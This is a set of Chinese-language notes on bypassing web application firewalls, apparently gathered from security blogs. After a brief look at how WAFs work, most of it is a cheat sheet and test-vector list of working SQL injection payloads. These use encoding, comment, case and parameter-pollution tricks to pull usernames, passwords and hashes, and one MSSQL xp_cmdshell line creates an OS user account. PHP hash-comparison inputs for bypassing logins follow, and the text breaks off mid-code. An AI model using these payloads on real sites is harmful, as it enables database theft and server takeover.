#SQL注入绕过WAF
http://netsecurity.51cto.com/art/201803/567738.htm
WAF区别于常规防火墙，因为WAF能够过滤特定Web应用程序的内容，而常规防火墙充当的则是服务器之间的安全门。通过检查HTTP流量，它可以防止源自Web应用安全漏洞的攻击，如SQL注入，XSS，文件包含和安全配置错误。

Web应用程序防火墙(WAF)的主要作用是过滤，监控和阻止各类进出Web应用程序的HTTP流量。WAF区别于常规防火墙，因为WAF能够过滤特定Web应用程序的内容，而常规防火墙充当的则是服务器之间的安全门。通过检查HTTP流量，它可以防止源自Web应用安全漏洞的攻击，如SQL注入，XSS，文件包含和安全配置错误。

##WAF是如何工作的?

协议异常检测：拒绝不符合HTTP标准的请求
增强的输入验证：代理和服务器端验证，而不仅仅是客户端验证
白名单和黑名单
基于规则和基于异常的保护：基于规则的更依赖黑名单机制，基于异常则更灵活
状态管理：关注会话保护还有：Cookie保护，反入侵规避技术，响应监控和信息披露保护。

##WAF的常见特征
之所以要谈到WAF的常见特征，是为了更好的了解WAF的运行机制，这样就能增加几分绕过的机会了。本文不对WAF做详
细介绍，只谈及几点相关的。
总体来说，WAF(Web Application Firewall)的具有以下四个方面的功能：
1. 审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话
2. 访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式
3. 架构/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。
4. WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应
用编程错误导致的安全隐患。
###WAF的常见特点：
	异常检测协议：拒绝不符合HTTP标准的请求
	增强的输入验证：代理和服务端的验证，而不只是限于客户端验证
	白名单&黑名单：白名单适用于稳定的We应用，黑名单适合处理已知问题
	基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活
	状态管理：重点进行会话保护
	另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等

###如果是对于扫描器，WAF有其识别之道：
扫描器识别主要由以下几点：

	1) 扫描器指纹(head字段/请求参数值)，以wvs为例，会有很明显的Acunetix在内的标识
	2) 单IP+ cookie某时间段内触发规则次数
	3) 隐藏的链接标签等(`<a>`)
	4) Cookie植入
	5) 验证码验证，扫描器无法自动填充验证码
	6) 单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏感目录基于字典，找不到文件则返回404

##WAF探测
###拆散SQL语句：
通常的做法是：需要把SQL注入语句给拆散，来检查是哪个关键字被过滤了。比如，如果你输入的是
union+select语句，给你报了一个403或内部服务器错误，什么union不合法什么的，就知道过滤了哪些
了，也是常见的Fuzzing测试。这是制造bypass语句的前提
###冗长的报错：
当你的sql语法输入错误时、对方网站又没关闭错误回显的时候，会爆出一大堆错误，在php中更会爆出
敏感的网站根目录地址。aspx则会爆出整个语法错误详细信息。

	比如你输入的语法是：
	id=1+Select+1,2,3--
	会给你报出以下错误：
	Error at line 1 near " "+1,2,3--
	上面也说过了黑名单方式过滤，也可以采用以下方式进行绕过：
	sel%0bect+1,2,3
###异或注入攻击
异或注入
http://120.24.86.145:9004/1ndex.php?id=1'^(0)^ '
两个同为真的条件做异或，结果为假
两个同为假的条件做异或，结果为假
一个条件为真，一个条件为假，结果为真
null与任何条件（真、假、null）做异或，结果都为null
###大量数据填充

##如何绕过WAF?
###绕过技术小结

1. 绕过大小写过滤
	当我们在目标URL进行SQL注入测试时，可以通过修改注入语句中字母的大小写来触发WAF保护情况。如果WAF使用区分大小写的黑名单，则更改大小写可能会帮我们成功绕过WAF的过滤。

		http://target.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4

2. 关键字替换
	(在关键字中间可插入将会被WAF过滤的字符) – 例如SELECT可插入变成SEL
	正则表达式替换或删除select、union等关键字，且只匹配一次

		http://target.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4
		同样是很基础的技术，有些时候甚至构造得更复杂：SeLSeselectleCTecT

3. 编码绕过
	+ URL encode  
	普通的URL编码可能无法实现绕过不过，存在某种情况URL编码只进行了一次解码过滤可以用两次编码绕过

			空格变为%20、单引号%27、左括号%28、右括号%29、百分号%25
			page.php?id=1%252f%252a*/UNION%252f%252a/SELECT
			page.php?id=1%2f%2a*/UNION%2f%2a/SELECT 一次解码
			page.php?id=1/**/UNION/*/SELECT   两次解码

			换行符%0a,%0b,%10
	
	+ Hex encode
	
			target.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4…//对单个字符十六进制编码
			SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) //对整个字符串编码
			常见的编码当然还有二进制、八进制
	
	+ Unicode encode
	
			?id=10%D6‘%20AND%2201=2%23   //%df绕过addslashes,逃逸'或",%D6同理，双字节绕过（也叫宽字节注入），比如对单引号转义操作变成\'，那么就变成了%D6%5C'，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用

			SELECT 'Ä'='A'; #1 //使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过
		
			utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过，有兴趣的朋友可以去了解下
		
			单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7
			空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0
			左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8
			右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9

4. 使用注释

	在攻击字符串中插入注释。例如，/*!SELECT*/ 这样WAF可能就会忽略该字符串，但它仍会被传递给目标应用程序并交由mysql数据库处理。/**/在构造的查询语句中插入注释规避对空格的依赖或关键字识别。

		常见的注释符号：//, — , /**/, #, –+,–  -, ;–a
		index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4 //普通注释绕过过滤空格、tab等
		'union%a0select pass from users#  //%0b,%10等换行符
		index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3 //内联
		?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4 //内联版本 

	绕过过滤空格类字符

		1. 两个空格代替一个空格，用Tab代替空格，%a0=空格，注释代替空格
		%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/
		2. 括号绕过空格：
		如果空格被过滤，括号没有被过滤，可以用括号绕过。
		在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格
		

5. 某些函数或命令，因为WAF的过滤机制导致我们无法使用。那么，我们也可以尝试用一些等价函数来替代它们。

	+ 函数或变量
	
			hex()、bin() ==> ascii()   
			sleep() ==>benchmark()   
			concat_ws()==>group_concat() 
			substr((select 'password'),1,1) = 0x70   
			strcmp(left('password',1), 0x69) = 1   
			strcmp(left('password',1), 0x70) = 0   
			strcmp(left('password',1), 0x71) = -1 
			mid()、substr() ==> substring()  
			@@user ==> user()  
			@@datadir ==> datadir() 

			举例：
		
				substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
				或者：substr((select 'password'),1,1) = 0x70
				strcmp(left('password',1), 0x69) = 1
				strcmp(left('password',1), 0x70) = 0
				strcmp(left('password',1), 0x71) = -1
			上述这几个示例用于说明有时候当某个函数不能使用时，还可以找到其他的函数替代其实现，置于select、uinon、where等
				关键字被限制如何处理将在后面filter部分讨论

	+ 符号

			1. and和or有可能不能使用，或者可以试下&&和||能不能用；还有=不能使用的情况，可以考虑尝试<、>，因为如果不小于又不大于，那边是等于了
			
			2. 在看一下用得多的空格，可以使用如下符号表示其作用：%20 %09 %0a %0b %0c %0d %a0 /**/ \t

	+ 生僻函数（updatexml（,select语句）、extractvalue（，）、floor()、NAME_CONST(适用于低版本)）

			MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘<script x=_></script>’,’/script/@x/’,’src=//evil.com’);

			?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))
			SELECT xmlelement(name img,xmlattributes(1as src,'a\l\x65rt(1)'as \117n\x65rror)); //
			
			postgresql
			?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
			MySQL、PostgreSQL、Oracle它们都有许多自己的函数，基于黑名单的filter要想涵盖这么多东西从实际上来说不太可
			能，而且代价太大，看来黑名单技术到一定程度便遇到了限制

6. 使用特殊符号
	这里我把非字母数字的字符都规在了特殊符号一类，特殊符号有特殊的含义和用法。

	+ \`symbol: select \`version()\`; 反引号，可以用来过空格和正则，特殊情况下还可以将其做注释符用
	+ +- :select+id-1+1.from users; “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤
	+ @:select@^1.from users; @用于变量定义如@var_name，一个@表示用户定义，@@表示系统变量
	+ Mysql function() as xxx；也可不用as和空格
	+ `、~、!、@、%、()、[]、.、-、+ 、|、%00 
	+ 操作符供参考：>>, <<, >=, <=, <>,<=>,XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN
	
	示例
	
		‘se’+’lec’+’t’   
		%S%E%L%E%C%T 1   
		1.aspx?id=1;EXEC(‘ma’+'ster..x’+'p_cm’+'dsh’+'ell ”net user”’)  
		' or --+2=- -!!!'2   
		id=1+(UnI)(oN)+(SeL)(EcT)	////另 Access中,”[]”用于表和列,”()”用于数值也可以做分隔
		select-count(id)test from users;  //绕过空格限制

7. HTTP参数控制  
	通过提供多个参数=相同名称的值集来混淆WAF。例如 http://example.com?id=1&?id=’ or ‘1’=’1′ — ‘在某些情况下(例如使用Apache/PHP)，应用程序将仅解析最后(第二个) id= 而WAF只解析第一个。在应用程序看来这似乎是一个合法的请求，因此应用程序会接收并处理这些恶意输入。如今，大多数的WAF都不会受到HTTP参数污染(HPP)的影响，但仍然值得一试。

	+ HPP(HTTP Parameter Polution))

			/?id=1;select+1,2,3+from+users+where+id=1—   
			/?id=1;select+1&amp;id=2,3+from+users+where+id=1—   
			/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users 
		HPP又称做重复参数污染，最简单的就是?uid=1&uid=2&uid=3，对于这种情况，不同的Web服务器处理方式如下：

	+ HPF(HTTP Parameter Fragment)

		这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行)

		/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--   
		select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users— 

	+ HPC(HTTP Parameter Contamination)

		这一概念见于exploit-db上的paper：Beyond SQLi: Obfuscate and Bypass，Contamination同样意为污染
		RFC2396定义了以下字符：
		Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ' () 
		Reserved : ; / ? : @ &amp; = + $ , 
		Unwise : { } | \ ^ [ ] ` 
		不同的Web服务器处理处理构造得特殊请求时有不同的逻辑：
		以魔术字符%为例，Asp/Asp.net会受到影响



8. 缓冲区溢出

	WAF和其他所有的应用程序一样也存在着各种缺陷和漏洞。如果出现缓冲区溢出的情况，那么WAF可能就会崩溃，即使不能代码执行那也会使WAF无法正常运行。这样，WAF的安全防护自然也就被瓦解了。

		?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 

9. 整合绕过

	当使用单一的方式无法绕过时，我们则可以灵活的将多种方式结合在一起尝试。

		target.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 "A")..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…   

		id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– -   

		?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e-- 

10. 闭合

		%df'
		'
		and '1'='1
		%23
		#
		-- 123
		#、–+用于终结语句的查询

11. 利用WAF逻辑漏洞

		比如你分析到最后，发现所有的*都被换成空白了，就意味着你不能使用内联注释了，union+select也会给你返回一个403错误，在这种情况下，你应该充分利用*被替换成空白：
			id=1+uni*on+sel*ect+1,2,3--+
		这样的话，*被过滤掉了，但是union+select被保留下来了。这是常见的WAF bypass技巧，当然不仅仅是union+select，其他的语法被过滤了都可以采用这种的。找到被替换的那个关键字，你就能找到绕过的方法

12. sql约束攻击

		1. 在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”
		2. 在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。
		3. 使用“vampire”与random_pass即可登录绕过
		4. 但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。

###常见绕过实例
1. 绕过空格（注释符/* */，%a0）：

		两个空格代替一个空格，用Tab代替空格，%a0=空格,删除所有空格：
			%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/
		最基本的绕过方法，用注释替换空格：
			/*  注释 */
		使用浮点数：
			select * from users where id=8E0union select 1,2,3
			select * from users where id=8.0 select 1,2,3

2. 括号绕过空格：

		如果空格被过滤，括号没有被过滤，可以用括号绕过。
		在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。
		例如：
			select(user())from dual where(1=1)and(2=2)

		这种过滤方法常常用于time based盲注,例如：
			?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23
			（from for属于逗号绕过下面会有）
		上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。

3. 引号绕过（使用十六进制）

		会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：
			select column_name  from information_schema.tables where table_name="users"
		这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。
		users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：
			select column_name  from information_schema.tables where table_name=0x7573657273

		闭合引号：加引号，注释，转义，宽字节注入
		转义逃逸单引号，形成一个查询内容，加or 1行程全真语句

4. 逗号绕过（使用from或者offset）：

		在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。
		对于substr()和mid()这两个方法可以使用from to的方式来解决：
			select substr(database(0 from 1 for 1);
			select mid(database(0 from 1 for 1);
		使用join：
			union select 1,2     #等价于
			union select * from (select 1)a join (select 2)b
		使用like：
			select ascii(mid(user(),1,1))=80   #等价于
			select user() like 'r%'
		对于limit可以使用offset来绕过：
			select * from news limit 0,1
			# 等价于下面这条SQL语句
			select * from news limit 1 offset 0

5. 比较符号（<>）绕过（过滤了<>：sqlmap盲注经常使用<>，使用between的脚本）：

		使用greatest()、least（）：（前者返回最大值，后者返回最小值）
			同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。
			最常见的一个盲注的sql语句：
				select * from users where id=1 and ascii(substr(database(),0,1))>64
			此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。
			greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。
			那么上面的这条sql语句可以使用greatest变为如下的子句:
				select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64

		使用between and：
			between a and b：返回a，b之间的数据，不包含b。
6. or and xor not绕过：
	
	and=&&  or=||   xor=|   not=!

7. 绕过注释符号（#，--(后面跟一个空格））过滤：

	id=1' union select 1,2,3||'1

　　最后的or '1闭合查询语句的最后的单引号，或者：
		id=1' union select 1,2,'3

8. =绕过：

	使用like 、rlike 、regexp、in、between或者 使用< 或者 >

9. 绕过union，select，where等：
	
	(1)使用注释符绕过：
	　　常用注释符：
			//，-- , /**/, #, --+, -- -, ;,%00,--a
	　　用法：
			U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user
	(2)使用大小写绕过：
		id=-1'UnIoN/**/SeLeCT
	(3)内联注释绕过：
		id=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#
	(4)双关键字绕过（若删除掉第一个匹配的union就能绕过）：
		id=-1'UNIunionONSeLselectECT1,2,3–-
	(5) 通过+号拆解字符串绕过
		如 or ‘swords’ =‘sw’ +’ ords’ ；EXEC(‘IN’ +’ SERT INTO ‘+’ …..’ )

10. 通用绕过（编码）：

	如URLEncode编码，ASCII,HEX,unicode编码绕过：
	or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)

11. 等价函数绕过：

		hex()、bin() ==> ascii()
		
		sleep() ==>benchmark()
		
		concat_ws()==>group_concat()
		
		mid()、substr() ==> substring()
		
		@@user ==> user()
		
		@@datadir ==> datadir()
		
		举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　
		
		或者：
		substr((select 'password'),1,1) = 0x70
		strcmp(left('password',1), 0x69) = 1
		strcmp(left('password',1), 0x70) = 0
		strcmp(left('password',1), 0x71) = -1

12. 宽字节注入：

	过滤 ' 的时候往往利用的思路是将 ' 转换为 \'

		在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：
		（1）%df 吃掉 \ 具体的方法是 urlencode('\) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（'）符号在外面：
			id=-1%df%27union select 1,user(),3--+
		（2）将 \' 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。
	
		一般产生宽字节注入的PHP函数：
			1.replace（）：过滤 ' \ ，将 ' 转化为 \' ，将 \  转为 \\，将 " 转为 \" 。用思路一。
			2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：' , " , \ 。用思路一（防御此漏洞，要将 mysql_query 设置为 binary 的方式）
			3.mysql_real_escape_string()：转义下列字符：\x00     \n     \r     \     '     "     \x1a（防御，将mysql设置为gbk即可）
13. 通过类型转换修饰符N绕过基于知识的模式匹配IDS
 
	可以说这是一个不错的想法，他除了能在某种程度上绕过限制，而且还有别的作用，大家自己好好想想吧。关于利用，如or ‘swords’ = N’ swords’ ，大写的N告诉mssql server 字符串作为nvarchar类型，它起到类型转换的作用，并不影响注射语句本身，但是可以避过基于知识的模式匹配IDS。

##SQLi Filter Evasion Cheat sheet
###Cheat sheet

	#注释
	‘ or 1=1#
	‘ or 1=1/* (MySQL < 5.1)
	' or 1=1;%00
	' or 1=1 union select 1,2 as `
	' or#newline
	' /*!50000or*/1='1
	' /*!or*/1='1
	#前缀
	+ – ~ !
	‘ or –+2=- -!!!’2
	#操作符：
	^, =, !=, %, /, *, &, &&, |, ||, , >>, <=, <=, ,, XOR, DIV, LIKE, SOUNDS LIKE, RLIKE, REGEXP, LEAST, GREATEST, CAST, CONVERT, I
	S, IN, NOT, MATCH, AND, OR, BINARY, BETWEEN, ISNULL
	#空格
	%20 %09 %0a %0b %0c %0d %a0 /**/
	‘or+(1)sounds/**/like“1“–%a0-
	‘union(select(1),tabe_name,(3)from`information_schema`.`tables`)#
	#有引号的字符串
	SELECT ‘a’
	SELECT “a”
	SELECT n’a’
	SELECT b’1100001′
	SELECT _binary’1100001′
	SELECT x’61′
	#没有引号的字符串
	‘abc’ = 0×616263
	' and substr(data,1,1) = 'a'#
	' and substr(data,1,1) = 0x61 # 0x6162
	' and substr(data,1,1) = unhex(61) # unhex(6162)
	' and substr(data,1,1) = char(97 )# char(97,98)
	' and substr(data,1,1) = 'a'#
	' and hex(substr(data,1,1)) = 61#
	' and ascii(substr(data,1,1)) = 97#
	' and ord(substr(data,1,1)) = 97#
	' and substr(data,1,1) = lower(conv(10,10,36))# 'a'
	#别名
	select pass as alias from users
	select pass`alias alias`from users
	#字型
	‘ or true = ’1 # or 1=1
	‘ or round(pi(),1)+true+true = version() # or 3.1+1+1 = 5.1
	‘ or ’1 # or true
	#操作符字型
	select * from users where ‘a’='b’='c’
	select * from users where (‘a’='b’)=’c’
	select * from users where (false)=’c’
	#认真绕过‘=’
	select * from users where name = ”=”
	select * from users where false = ”
	select * from users where 0 = 0
	select * from users where true#函数过滤器ascii (97)
	load_file/*foo*/(0×616263)
	#用函数构建字符串
	‘abc’ = unhex(616263)
	‘abc’ = char(97,98,99)
	hex(‘a’) = 61
	ascii(‘a’) = 97
	ord(‘a’) = 97
	‘ABC’ = concat(conv(10,10,36),conv(11,10,36),conv(12,10,36))
	#特殊字符
	aes_encrypt(1,12) // 4鏷眥"^z譎é蒃a
	des_encrypt(1,2) // 侴Ò/镏k
	@@ft_boolean_syntax // + -><()~*:""&|
	@@date_format // %Y-%m-%d
	@@innodb_log_group_home_dir // .\
	@@new: 0
	@@log_bin: 1
	#提取子字符串substr(‘abc’,1,1) = ‘a’
	substr(‘abc’ from 1 for 1) = ‘a’
	substring(‘abc’,1,1) = ‘a’
	substring(‘abc’ from 1 for 1) = ‘a’
	mid(‘abc’,1,1) = ‘a’
	mid(‘abc’ from 1 for 1) = ‘a’
	lpad(‘abc’,1,space(1)) = ‘a’
	rpad(‘abc’,1,space(1)) = ‘a’
	left(‘abc’,1) = ‘a’
	reverse(right(reverse(‘abc’),1)) = ‘a’
	insert(insert(‘abc’,1,0,space(0)),2,222,space(0)) = ‘a’
	space(0) = trim(version()from(version()))
	#搜索子字符串
	locate(‘a’,'abc’)
	position(‘a’,'abc’)
	position(‘a’ IN ‘abc’)
	instr(‘abc’,'a’)
	substring_index(‘ab’,'b’,1)
	#分割字符串
	length(trim(leading ‘a’ FROM ‘abc’))
	length(replace(‘abc’, ‘a’, ”))
	#比较字符串
	strcmp(‘a’,'a’)
	mod(‘a’,'a’)
	find_in_set(‘a’,'a’)
	field(‘a’,'a’)
	count(concat(‘a’,'a’))
	#字符串长度
	length()
	bit_length()
	char_length()
	octet_length()
	bit_count()
	#关键字过滤
	Connected keyword filtering
	(0)union(select(table_name),column_name,…
	0/**/union/*!50000select*/table_name`foo`/**/…
	0%a0union%a0select%09group_concat(table_name)….
	0′union all select all`table_name`foo from`information_schema`. `tables`
	#控制流
	case ‘a’ when ‘a’ then 1 [else 0] end
	case when ‘a’='a’ then 1 [else 0] end
	if(‘a’='a’,1,0)
	ifnull(nullif(‘a’,'a’),1)

###测试向量

	%55nion(%53elect 1,2,3)-- -
	+union+distinctROW+select+
	/**//*!12345UNION SELECT*//**/
	/**/UNION/**//*!50000SELECT*//**/
	/*!50000UniON SeLeCt*/
	+#uNiOn+#sEleCt
	+#1q%0AuNiOn all#qa%0A#%0AsEleCt
	/*!u%6eion*/ /*!se%6cect*/
	+un/**/ion+se/**/lect
	uni%0bon+se%0blect
	%2f**%2funion%2f**%2fselect
	union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
	REVERSE(noinu)+REVERSE(tceles)
	/*--*/union/*--*/select/*--*/
	union (/*!/**/ SeleCT */ 1,2,3)
	/*!union*/+/*!select*/
	union+/*!select*/
	/**//*!union*//**//*!select*//**/
	/*!uNIOn*/ /*!SelECt*/
	+union+distinctROW+select+
	-15+(uNioN)+(sElECt)
	-15+(UnI)(oN)+(SeL)(ecT)+
	id=1+UnIOn/**/SeLect 1,2,3—
	id=1+UNIunionON+SELselectECT 1,2,3—
	id=1+/*!UnIOn*/+/*!sElEcT*/ 1,2,3—
	id=1 and (select 1)=(Select 0xAA 1000 more A’s)+UnIoN+SeLeCT 1,2,3—
	id=1+un/**/ion+sel/**/ect+1,2,3--
	id=1+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/1,2,3
	id=1+/**/union/*&id=*/select/*&id=*/column/*&id=*/from/*&id=*/table--
	id=1+/**/union/*&id=*/select/*&id=*/1,2,3--
	id=-1 and (select 1)=(Select 0xAA*1000) /*!UNION*/ /*!SELECT*//**/1,2,3,4,5,6—x
	/**/union/*&id=*/select/*&id=*/column/*&id=*/from/*&id=*/table--
	/*!union*/+/*!select*/+1,2,3—
	/*!UnIOn*//*!SeLect*/+1,2,3—
	un/**/ion+sel/**/ect+1,2,3—
	/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/1,2,3—
	ID=66+UnIoN+aLL+SeLeCt+1,2,3,4,5,6,7,(SELECT+concat(0x3a,id,0x3a,password,0x3a)+FROM+information_schema.columns+WH
	ERE+table_schema=0x6334706F645F666573746976616C5F636D73+AND+table_name=0x7573657273),9,10,11,12,13,14,15,16,17,
	18,19,20,21,22,23,24,25,26,27,28,29,30--
	?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
	index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123
	?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,
	?id=15+/*!UnIoN*/+/*!aLl*/+/*!SeLeCt*/+1,version(),3,4,5,6,7--
	id=1/*!limit+0+union+select+concat_ws(0×3a,table_name,column_name)+from+information_schema.columns*/
	id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(TABLE_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.TABLES--
	id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WH
	ERE+TABLE_NAME=0x41646d696e--
	SELECT*FROM(test)WHERE(name)IN(_ucs2 0x01df010e004d00cf0148);
	SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) in xml way
	select user from mysql.user where user = 'user' OR mid(password,1,1)=unhex('2a')
	select user from mysql.user where user = 'user' OR mid(password,1,1) regexp '[*]'
	select user from mysql.user where user = 'user' OR mid(password,1,1) like '*'
	select user from mysql.user where user = 'user' OR mid(password,1,1) rlike '[*]'
	select user from mysql.user where user = 'user' OR ord(mid(password,1,1))=42
	/?id=1+union+(select'1',concat(login,hash)from+users)
	/?id=(1)union(((((((select(1),hex(hash)from(users))))))))
	?id=1'; /*&id=1*/ EXEC /*&id=1*/ master..xp_cmdshell /*&id=1*/ net user lucifer UrWaFisShiT /*&id=1*/ --
	id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)
	id=10 and 1=0/(select top 1 table_name from information_schema.tables)
	id=-725+UNION+SELECT+1,GROUP_CONCAT(id,0x3a,login,0x3a,password,0x3a,email,0x3a,access_level),3,4,5+FROM+Admin--
	id=-725+UNION+SELECT+1,version(),3,4,5--sp_password //使用sp_password隐藏log中的请求

#命令执行绕过技术
system()、exec()、shell_exec()、passthru()、 escapeshellcmd()、pcntl_exec()

#代码执行绕过技术
eval()、assert()、``、 

#文件上传绕过技术


#文件包含绕过技术
include()、include_once()、 require()、require_once()

#文件下载绕过技术


#php函数漏洞bypass
http://blog.csdn.net/qq_35078631/article/details/75200157

1. 弱类型比较

		<?php  
		
		    // 0x 开头会被当成16进制54975581388的16进制为 0xccccccccc
		    // 十六进制与整数，被转换为同一进制比较
		    '0xccccccccc' == '54975581388' ;
		
		    // 字符串在与数字比较前会自动转换为数字，如果不能转换为数字会变成0
		    1 == '1';
		    1 == '01';
		    10 == '1e1';
		    '100' == '1e2' ;
		    echo 0 == 'a' ;// a 转换为数字为 0    重点注意
			echo 1 =='1a';//1a转换为数字1
		
		    // 十六进制数与带空格十六进制数，被转换为十六进制整数
		    '0xABCdef'  == '     0xABCdef';
		    echo '0010e2' == '1e3';
		
		    // 0e 开头会被当成数字，又是等于 0*10^xxx=0
		    // 如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过
		    '0e509367213418206700842008763514' == '0e481036490867661113260034900752';
		    '0e481036490867661113260034900752' == '0' ;
		
		    var_dump(md5('240610708') == md5('QNKCDZO'));
		    var_dump(md5('aabg7XSs') == md5('aabC9RqS'));
		    var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
		    var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
		?>

2. MD5 compare漏洞
		
		PHP在处理哈希字符串时，如果利用”!=”或”==”来对哈希值进行比较，它把每一个以”0x”开头的哈希值都解释为科学计数法0的多少次方（为0），所以如果两个不同的密码经过哈希以后，其哈希值都是以”0e”开头的，那么php将会认为他们相同。
		常见的payload有：

			0x01 md5(str)
			    QNKCDZO
			    240610708
			    s878926199a
			    s155964671a
			    s214587387a
			    s214587387a
			0x02 sha1(str)
			    sha1('aaroZmOk')  
			    sha1('aaK1STfY')
			    sha1('aaO8zKZF')
			    sha1('aa3OFF9m')
	
			0x03 同时MD5不能处理数组，若有以下判断则可用数组绕过
				if(@md5($_GET['a']) == @md5($_GET['b']))
				{
				    echo "yes";
